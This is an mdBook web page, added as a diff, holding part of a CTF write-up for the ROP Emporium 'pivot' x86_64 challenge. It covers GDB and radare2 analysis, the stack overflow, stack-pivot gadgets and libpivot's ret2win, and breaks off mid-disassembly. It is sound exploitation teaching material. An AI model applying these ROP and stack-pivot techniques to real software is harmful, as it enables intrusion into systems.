@@ -1,0 +1,765 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>pivot - CTF Write-Ups</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../index.html">Introduction</a></li><li class="chapter-item expanded "><a href="../../../../pwn.college/index.html"><strong aria-hidden="true">1.</strong> pwn.college</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../pwn.college/2020/00-Setup/index.html"><strong aria-hidden="true">1.1.</strong> Docker Setup</a></li><li class="chapter-item expanded "><a href="../../../../pwn.college/2020/04-Rev/14_testing1/index.html"><strong aria-hidden="true">1.2.</strong> Reversing - Level 14</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/index.html"><strong aria-hidden="true">2.</strong> ROP Emporium</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/01-ret2win/index.html"><strong aria-hidden="true">2.1.</strong> ret2win</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/02-split/index.html"><strong aria-hidden="true">2.2.</strong> split</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/03-callme/index.html"><strong aria-hidden="true">2.3.</strong> callme</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/04-write4/index.html"><strong aria-hidden="true">2.4.</strong> write4</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/05-badchars/index.html"><strong aria-hidden="true">2.5.</strong> badchars</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/06-fluff/index.html"><strong aria-hidden="true">2.6.</strong> fluff</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/07-pivot/index.html" class="active"><strong aria-hidden="true">2.7.</strong> pivot</a></li><li class="chapter-item expanded "><a href="../../../../rop_emporium/solutions/x86_64/08-ret2csu/index.html"><strong aria-hidden="true">2.8.</strong> ret2csu</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">CTF Write-Ups</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="rop-emporium---07-pivot-x86_64"><a class="header" href="#rop-emporium---07-pivot-x86_64">ROP Emporium - 07 pivot x86_64</a></h1>
+<h2 id="elf-binary-info"><a class="header" href="#elf-binary-info">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./pivot</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6973
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="run-elf-binary-to-understand-required-inputs"><a class="header" href="#run-elf-binary-to-understand-required-inputs">Run ELF Binary to Understand Required Inputs</a></h2>
+<blockquote>
+<p>$ <code>./pivot</code></p>
+</blockquote>
+<pre><code>pivot by ROP Emporium
+x86_64
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0x7f5bc24b1f10
+Send a ROP chain now and it will land there
+&gt; 11111111
+Thank you!
+
+Now please send your stack smash
+&gt; 22222222
+Thank you!
+
+Exiting
+</code></pre>
+<ul>
+<li>Having now interacted with the program, we know that two separate inputs are required, as shown in the above output</li>
+<li>In the above example, the 1st input was <code>11111111</code> and the 2nd input was <code>22222222</code></li>
+<li>The program gives us a place to pivot our stack to <code>0x7f5bc24b1f10</code>, but if we run the program multiple times, we can see that the pivot location changes everytime we re-run the program:</li>
+</ul>
+<blockquote>
+<p>$ <code>./pivot</code></p>
+</blockquote>
+<pre><code>The Old Gods kindly bestow upon you a place to pivot: 0x7fe029d6bf10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7f93d81b7f10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7fbf2be90f10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7fac4dd64f10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7f00e1bbef10
+[...]
+The Old Gods kindly bestow upon you a place to pivot: 0x7f85ec39df10
+</code></pre>
+<ul>
+<li>Also note that since the pivot location is printed <strong>before</strong> the 2nd input is requested, we are able to capture it and use it as part of the 2nd input if necessary</li>
+</ul>
+<h2 id="using-gdb-with-a-fifo-for-input"><a class="header" href="#using-gdb-with-a-fifo-for-input">Using GDB with a FIFO for Input</a></h2>
+<ul>
+<li>Use two terminals to make it easier to send input to the running GDB process</li>
+</ul>
+<h3 id="1st-terminal"><a class="header" href="#1st-terminal">1st terminal</a></h3>
+<ul>
+<li>Make a <a href="https://www.man7.org/linux/man-pages/man7/fifo.7.html">FIFO</a> using <code>mkfifo &lt;name_of_fifo&gt;</code>:</li>
+</ul>
+<blockquote>
+<p>$ <code>mkfifo my_fifo</code></p>
+</blockquote>
+<ul>
+<li>Then open ELF binary in GDB (<code>-q</code> is for quiet mode):</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb ./pivot -q</code></p>
+</blockquote>
+<ul>
+<li>Disassemble <code>pwnme</code> function:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>[...]
+   0x000000000040091d &lt;+44&gt;:	mov    rax,QWORD PTR [rbp-0x28]
+   0x0000000000400921 &lt;+48&gt;:	mov    rsi,rax
+   0x0000000000400924 &lt;+51&gt;:	mov    edi,0x400ac8
+   0x0000000000400929 &lt;+56&gt;:	mov    eax,0x0
+   0x000000000040092e &lt;+61&gt;:	call   0x4006f0 &lt;printf@plt&gt;
+   0x0000000000400933 &lt;+66&gt;:	mov    edi,0x400b08
+   0x0000000000400938 &lt;+71&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x000000000040093d &lt;+76&gt;:	mov    edi,0x400b34
+   0x0000000000400942 &lt;+81&gt;:	mov    eax,0x0
+   0x0000000000400947 &lt;+86&gt;:	call   0x4006f0 &lt;printf@plt&gt;
+   0x000000000040094c &lt;+91&gt;:	mov    rax,QWORD PTR [rbp-0x28]
+   0x0000000000400950 &lt;+95&gt;:	mov    edx,0x100
+   0x0000000000400955 &lt;+100&gt;:	mov    rsi,rax
+   0x0000000000400958 &lt;+103&gt;:	mov    edi,0x0
+   0x000000000040095d &lt;+108&gt;:	call   0x400710 &lt;read@plt&gt;
+   0x0000000000400962 &lt;+113&gt;:	mov    edi,0x400b37
+   0x0000000000400967 &lt;+118&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x000000000040096c &lt;+123&gt;:	mov    edi,0x400b48
+   0x0000000000400971 &lt;+128&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x0000000000400976 &lt;+133&gt;:	mov    edi,0x400b34
+   0x000000000040097b &lt;+138&gt;:	mov    eax,0x0
+   0x0000000000400980 &lt;+143&gt;:	call   0x4006f0 &lt;printf@plt&gt;
+   0x0000000000400985 &lt;+148&gt;:	lea    rax,[rbp-0x20]
+   0x0000000000400989 &lt;+152&gt;:	mov    edx,0x40
+   0x000000000040098e &lt;+157&gt;:	mov    rsi,rax
+   0x0000000000400991 &lt;+160&gt;:	mov    edi,0x0
+   0x0000000000400996 &lt;+165&gt;:	call   0x400710 &lt;read@plt&gt;
+[...]
+</code></pre>
+<ul>
+<li>There are two calls to <code>read</code>, set breakpoint at the 2nd call to <code>read</code> so that we can easily send our second input before continuing:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b *pwnme+165</code></p>
+</blockquote>
+<pre><code>Breakpoint 1 at 0x400996
+</code></pre>
+<ul>
+<li>We also know from the line <code>0x000000000040094c &lt;+91&gt;:	mov rax,QWORD PTR [rbp-0x28]</code> that the memory address of where our 1st input is stored is on the stack at <code>rbp-0x28</code>, so if we dereference address <code>rbp-0x28</code> (i.e. by using a command such as <code>x/16gx *((void**) ($rbp-0x28))</code>) when we have reached the above breakpoint we will be able to see our 1st input</li>
+<li>Let's also print some useful info at each breakpoint by using commands below:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>define hook-stop</code><br />
+&gt;<code>i r</code><br />
+&gt;<code>echo Pivot:\n</code><br />
+&gt;<code>x/16gx *((void**) ($rbp-0x28))</code><br />
+&gt;<code>echo Stack:\n</code><br />
+&gt;<code>x/16gx $rsp</code><br />
+&gt;<code>x/8i $rip</code><br />
+&gt;<code>end</code></p>
+</blockquote>
+<ul>
+<li>Setup is done, so now run the program with input from the FIFO:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>r &lt; my_fifo</code></p>
+</blockquote>
+<ul>
+<li>GDB is waiting for the 1st input, so go to the 2nd terminal to send the input</li>
+</ul>
+<h3 id="2nd-terminal"><a class="header" href="#2nd-terminal">2nd terminal</a></h3>
+<ul>
+<li>The FIFO named <code>my_fifo</code> has already been created, GDB has started running our ELF binary and it's now waiting for 1st input</li>
+<li>Let's simply echo some data and redirect to the FIFO (<code>-n</code> means do <strong>not</strong> output the trailing newline):</li>
+</ul>
+<blockquote>
+<p>$ <code>echo -n &quot;00000000111111112222222233333333444444445555555566666666777777778888888899999999::::::::;;;;;;;;&quot; &gt; my_fifo</code></p>
+</blockquote>
+<ul>
+<li>We know from the GDB session earlier, we've set a breakpoint just before the program asks for our 2nd input, so in the other terminal GDB will now have continued execution and reached that breakpoint</li>
+<li>Let's therefore send our 2nd input:</li>
+</ul>
+<blockquote>
+<p>$ <code>echo -n &quot;AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ&quot; &gt; my_fifo</code></p>
+</blockquote>
+<ul>
+<li>Now go back to the 1st terminal to continue using GDB</li>
+</ul>
+<h3 id="back-to-1st-terminal"><a class="header" href="#back-to-1st-terminal">Back to 1st Terminal</a></h3>
+<ul>
+<li>Now back in GDB we are at the breakpoint just <strong>before</strong> the program reads the 2nd input, and from the steps above we know we've already sent both 1st and 2nd inputs, but we just haven't yet executed the instruction that reads the 2nd input, so let's look at GDB's output to confirm our understanding</li>
+<li>Instruction pointer is <code>0x400996</code> and we're just before the <code>call 0x400710 &lt;read@plt&gt;</code> instruction:</li>
+</ul>
+<pre><code>rip            0x400996            0x400996 &lt;pwnme+165&gt;
+[...]
+=&gt; 0x400996 &lt;pwnme+165&gt;:	call   0x400710 &lt;read@plt&gt;
+   0x40099b &lt;pwnme+170&gt;:	mov    edi,0x400b69
+</code></pre>
+<ul>
+<li>Pivot address <code>0x7fb2f2a99f10</code> has correctly been dereferenced and <code>16gx</code> of hex output has been printed from that pivot address. In addition, we can see that all 96 bytes of our 1st input <code>00000000111111112222222233333333444444445555555566666666777777778888888899999999::::::::;;;;;;;;</code> has successfully been stored there:</li>
+</ul>
+<pre><code>The Old Gods kindly bestow upon you a place to pivot: 0x7fb2f2a99f10
+[...]
+Pivot:
+0x7fb2f2a99f10:	0x3030303030303030	0x3131313131313131
+0x7fb2f2a99f20:	0x3232323232323232	0x3333333333333333
+0x7fb2f2a99f30:	0x3434343434343434	0x3535353535353535
+0x7fb2f2a99f40:	0x3636363636363636	0x3737373737373737
+0x7fb2f2a99f50:	0x3838383838383838	0x3939393939393939
+0x7fb2f2a99f60:	0x3a3a3a3a3a3a3a3a	0x3b3b3b3b3b3b3b3b
+0x7fb2f2a99f70:	0x0000000000000000	0x0000000000000000
+0x7fb2f2a99f80:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<ul>
+<li>
+<p>From the disassembly (<code>0x0000000000400950 &lt;+95&gt;:	mov edx,0x100</code>), we also know that the 1st input will read up to 0x100 == 256 bytes of input</p>
+</li>
+<li>
+<p>The program hasn't read in our 2nd input yet, so we expect the stack to be also be in a state just prior to receiving that 2nd input</p>
+</li>
+<li>
+<p>Also note that for this execution <code>rbp-0x28 == 0x7ffd738679c0-0x28 == 0x7ffd73867998</code></p>
+</li>
+<li>
+<p>Value stored at <code>0x7ffd73867998</code> is <code>0x00007fb2f2a99f10</code>, which is our pivot address</p>
+</li>
+</ul>
+<pre><code>rbp            0x7ffd738679c0      0x7ffd738679c0
+rsp            0x7ffd73867990      0x7ffd73867990
+[...]
+Stack:
+0x7ffd73867990:	0x00007ffd73867ad0	0x00007fb2f2a99f10
+0x7ffd738679a0:	0x0000000000000000	0x0000000000000000
+0x7ffd738679b0:	0x0000000000000000	0x0000000000000000
+0x7ffd738679c0:	0x00007ffd738679e0	0x00000000004008cc
+0x7ffd738679d0:	0x00007fb2f2a99f10	0x00007fb2f1a9a010
+0x7ffd738679e0:	0x0000000000000000	0x00007fb2f2ac50b3
+0x7ffd738679f0:	0x0000000000000031	0x00007ffd73867ad8
+0x7ffd73867a00:	0x00000001f2c86618	0x0000000000400847
+</code></pre>
+<ul>
+<li>Execute the next instruction and analyse the output:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>ni</code></p>
+</blockquote>
+<pre><code>rax            0x40                64
+rbx            0x4009d0            4196816
+rcx            0x7fb2f2baf142      140406553243970
+rdx            0x40                64
+rsi            0x7ffd738679a0      140726541646240
+rdi            0x0                 0
+rbp            0x7ffd738679c0      0x7ffd738679c0
+rsp            0x7ffd73867990      0x7ffd73867990
+r8             0x2                 2
+r9             0x2                 2
+r10            0x400b34            4197172
+r11            0x246               582
+r12            0x400760            4196192
+r13            0x7ffd73867ad0      140726541646544
+r14            0x0                 0
+r15            0x0                 0
+rip            0x40099b            0x40099b &lt;pwnme+170&gt;
+eflags         0x203               [ CF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+Pivot:
+0x7fb2f2a99f10:	0x3030303030303030	0x3131313131313131
+0x7fb2f2a99f20:	0x3232323232323232	0x3333333333333333
+0x7fb2f2a99f30:	0x3434343434343434	0x3535353535353535
+0x7fb2f2a99f40:	0x3636363636363636	0x3737373737373737
+0x7fb2f2a99f50:	0x3838383838383838	0x3939393939393939
+0x7fb2f2a99f60:	0x3a3a3a3a3a3a3a3a	0x3b3b3b3b3b3b3b3b
+0x7fb2f2a99f70:	0x0000000000000000	0x0000000000000000
+0x7fb2f2a99f80:	0x0000000000000000	0x0000000000000000
+Stack:
+0x7ffd73867990:	0x00007ffd73867ad0	0x00007fb2f2a99f10
+0x7ffd738679a0:	0x4141414141414141	0x4242424242424242
+0x7ffd738679b0:	0x4343434343434343	0x4444444444444444
+0x7ffd738679c0:	0x4545454545454545	0x4646464646464646
+0x7ffd738679d0:	0x4747474747474747	0x4848484848484848
+0x7ffd738679e0:	0x0000000000000000	0x00007fb2f2ac50b3
+0x7ffd738679f0:	0x0000000000000031	0x00007ffd73867ad8
+0x7ffd73867a00:	0x00000001f2c86618	0x0000000000400847
+=&gt; 0x40099b &lt;pwnme+170&gt;:	mov    edi,0x400b69
+   0x4009a0 &lt;pwnme+175&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x4009a5 &lt;pwnme+180&gt;:	nop
+   0x4009a6 &lt;pwnme+181&gt;:	leave  
+   0x4009a7 &lt;pwnme+182&gt;:	ret    
+   0x4009a8 &lt;uselessFunction&gt;:	push   rbp
+   0x4009a9 &lt;uselessFunction+1&gt;:	mov    rbp,rsp
+   0x4009ac &lt;uselessFunction+4&gt;:	call   0x400720 &lt;foothold_function@plt&gt;
+</code></pre>
+<ul>
+<li>Now we can see that our 2nd input has now only partially been stored on the stack, we've actually overwritten the base pointer and the return address on the stack (<code>0x4848484848484848 == HHHHHHHH</code>)</li>
+<li>If we continue execution, we will segfault:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>c</code></p>
+</blockquote>
+<pre><code>Continuing.
+Thank you!
+
+Program received signal SIGSEGV, Segmentation fault.
+rax            0xb                 11
+rbx            0x4009d0            4196816
+rcx            0x7fb2f2baf1e7      140406553244135
+rdx            0x0                 0
+rsi            0x7fb2f2c8a723      140406554142499
+rdi            0x7fb2f2c8c4c0      140406554150080
+rbp            0x4545454545454545  0x4545454545454545
+rsp            0x7ffd738679c8      0x7ffd738679c8
+r8             0xb                 11
+r9             0x2                 2
+r10            0x400b34            4197172
+r11            0x246               582
+r12            0x400760            4196192
+r13            0x7ffd73867ad0      140726541646544
+r14            0x0                 0
+r15            0x0                 0
+rip            0x4009a7            0x4009a7 &lt;pwnme+182&gt;
+eflags         0x10246             [ PF ZF IF RF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+[...]
+</code></pre>
+<ul>
+<li>Analysis of what happened to our 2nd input <code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ</code>:
+<ul>
+<li>Only part of our 2nd input was stored on the stack, up to and including <code>HHHHHHHH</code>, but everything else was ignored. This is because the 2nd call to <code>read</code> only accepts 0x40 == 64 bytes of input, as shown in the disassembly line <code>0x0000000000400989 &lt;+152&gt;:	mov edx,0x40</code>.</li>
+<li>The first 32 bytes of the 2nd input doesn't affect anything, but the following 8 bytes <code>EEEEEEEE</code> was where the base pointer was stored.</li>
+<li>After the base pointer, <code>FFFFFFFF</code> was where the return address was stored.</li>
+<li>After the return address, only <code>GGGGGGGGHHHHHHHH</code> was captured and the rest of the 2nd input was ignored.</li>
+<li>Therefore we only have room for 3 ROP gadgets (or more precisely, 24 bytes), i.e. where <code>FFFFFFFFGGGGGGGGHHHHHHHH</code> was situated in our 2nd input.</li>
+</ul>
+</li>
+<li>So as hinted at every point in the challenge, we should perform a stack pivot to give extra room for more gadgets</li>
+<li>In the next section we will search for ROP gadgets that we can use and build the ROP chain</li>
+</ul>
+<h2 id="building-rop-chain"><a class="header" href="#building-rop-chain">Building ROP Chain</a></h2>
+<ul>
+<li>Open the ELF binary in radare2:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./pivot</code></p>
+</blockquote>
+<ul>
+<li>We want to control the stack pointer, so let's search for gadgets that include <code>rsp</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>/R rsp</code></p>
+</blockquote>
+<pre><code>[...]
+  0x004009bb                 58  pop rax
+  0x004009bc                 c3  ret
+  0x004009bd               4894  xchg rax, rsp
+  0x004009bf                 c3  ret
+[...]
+</code></pre>
+<ul>
+<li>The above gadgets are suitable for our 2nd input as we can use <code>pop rax</code> followed by the address to pivot to, then lastly <code>xchg rax, rsp</code> to get our desired pivot location into rsp (this is a total of 24 bytes, it's as if the maker of this challenge had planned it this way...)</li>
+<li>With the above ROP chain used as our 2nd input, the stack will have pivoted to where our 1st input was placed, so what ROP chain should we place there?</li>
+<li>Let's perform some further analysis on the binary using radare2, first by searching for functions:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>afl</code></p>
+</blockquote>
+<pre><code>[...]
+0x004009a8    1 19           sym.uselessFunction
+0x00400720    1 6            sym.imp.foothold_function
+[...]
+</code></pre>
+<ul>
+<li>Disassemble <code>uselessFunction</code> to see what it does:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>pdf @ sym.uselessFunction</code></p>
+</blockquote>
+<pre><code>╭ 19: sym.uselessFunction ();
+│           0x004009a8      55             push rbp
+│           0x004009a9      4889e5         mov rbp, rsp
+│           0x004009ac      e86ffdffff     call sym.imp.foothold_function
+│           0x004009b1      bf01000000     mov edi, 1                  ; int status
+╰           0x004009b6      e895fdffff     call sym.imp.exit           ; void exit(int status)
+</code></pre>
+<ul>
+<li><code>uselessFunction</code> calls <code>foothold_function</code> then just exits</li>
+<li><code>foothold_function</code> is an imported function, as it is prefixed by <code>sym.imp.</code> so lookup the address in PLT by printing info on imports and performing an internal grep:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>ii ~ foothold_function</code></p>
+</blockquote>
+<pre><code>8   0x00400720 GLOBAL FUNC       foothold_function
+</code></pre>
+<ul>
+<li>Therefore <code>foothold_function</code>'s PLT location is <code>0x400720</code></li>
+<li>Disassemble 3 lines at <code>sym.imp.foothold_function</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>pd3 @ sym.imp.foothold_function</code></p>
+</blockquote>
+<pre><code>        ╎   ; CALL XREF from sym.uselessFunction @ 0x4009ac
+╭ 6: sym.imp.foothold_function ();
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+│ rg: 0 (vars 0, args 0)
+╰       ╎   0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726 ; &quot;&amp;\a@&quot;
+        ╎   0x00400726      6805000000     push 5                      ; 5
+        ╰─&lt; 0x0040072b      e990ffffff     jmp sym..plt
+</code></pre>
+<ul>
+<li>Here we can see <code>foothold_function</code>'s GOT location is <code>0x601040</code></li>
+<li>But what does <code>foothold_function</code> even do? Quit radare2 using <code>q</code> key as many times as necessary then open the libpivot shared object file in radare2:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./libpivot.so</code></p>
+</blockquote>
+<ul>
+<li>Disassemble <code>foothold_function</code>:
+[0x00000890]&gt; <code>pdf @ sym.foothold_function</code></li>
+</ul>
+<pre><code>╭ 19: sym.foothold_function ();
+│           0x0000096a      55             push rbp
+│           0x0000096b      4889e5         mov rbp, rsp
+│           0x0000096e      488d3dab0100.  lea rdi, str.foothold_function__:_Check_out_my_.got.plt_entry_to_gain_a_foothold_into_libpivot ; sym..rodata
+│                                                                      ; 0xb20 ; &quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot; ; const char *s
+│           0x00000975      e8b6feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0000097a      90             nop
+│           0x0000097b      5d             pop rbp
+╰           0x0000097c      c3             ret
+</code></pre>
+<ul>
+<li>As it turns out, it doesn't seem to directly provide any benefit except for a potential <code>pop rbp</code> gadget, but maybe the library includes something else that might be of use, so list all functions:</li>
+</ul>
+<blockquote>
+<p>[0x00000890]&gt; <code>afl</code></p>
+</blockquote>
+<pre><code>0x00000890    4 50   -&gt; 40   entry0
+0x0000096a    1 19           sym.foothold_function
+[...]
+0x00000a81    3 146          sym.ret2win
+[...]
+</code></pre>
+<ul>
+<li><code>ret2win</code> looks like a winner, so disassemble it to confirm:
+[0x00000890]&gt; <code>pdf @ sym.ret2win</code></li>
+</ul>
+<pre><code>╭ 146: sym.ret2win ();
+│           ; var file*stream @ rbp-0x38
+│           ; var char *s @ rbp-0x30
+│           ; var int64_t var_8h @ rbp-0x8
+│           0x00000a81      55             push rbp
+│           0x00000a82      4889e5         mov rbp, rsp
+│           0x00000a85      4883ec40       sub rsp, 0x40
+│           0x00000a89      64488b042528.  mov rax, qword fs:[0x28]
+│           0x00000a92      488945f8       mov qword [var_8h], rax
+│           0x00000a96      31c0           xor eax, eax
+│           0x00000a98      48c745c80000.  mov qword [stream], 0
+│           0x00000aa0      488d35df0000.  lea rsi, [0x00000b86]       ; &quot;r&quot; ; const char *mode
+│           0x00000aa7      488d3dda0000.  lea rdi, str.flag.txt       ; 0xb88 ; &quot;flag.txt&quot; ; const char *filename
+│           0x00000aae      e8adfdffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
+│           0x00000ab3      488945c8       mov qword [stream], rax
+│           0x00000ab7      48837dc800     cmp qword [stream], 0
+│       ╭─&lt; 0x00000abc      7516           jne 0xad4
+│       │   0x00000abe      488d3dcc0000.  lea rdi, str.Failed_to_open_file:_flag.txt ; 0xb91 ; &quot;Failed to open file: flag.txt&quot; ; const char *s
+│       │   0x00000ac5      e866fdffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x00000aca      bf01000000     mov edi, 1                  ; int status
+│       │   0x00000acf      e89cfdffff     call sym.imp.exit           ; void exit(int status)
+│       │   ; CODE XREF from sym.ret2win @ 0xabc
+│       ╰─&gt; 0x00000ad4      488b55c8       mov rdx, qword [stream]     ; FILE *stream
+│           0x00000ad8      488d45d0       lea rax, [s]
+│           0x00000adc      be21000000     mov esi, 0x21               ; '!' ; int size
+│           0x00000ae1      4889c7         mov rdi, rax                ; char *s
+│           0x00000ae4      e867fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
